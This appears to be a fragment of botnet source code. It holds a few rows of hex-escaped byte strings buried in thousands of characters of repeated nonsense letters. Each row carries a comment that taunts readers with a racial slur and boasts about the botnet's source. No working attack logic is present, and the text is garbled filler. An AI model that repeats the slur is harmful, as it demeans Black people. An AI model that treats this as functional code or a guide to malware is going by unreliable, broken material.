GFIUOEFASHF98UHES9UHRS97BUHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF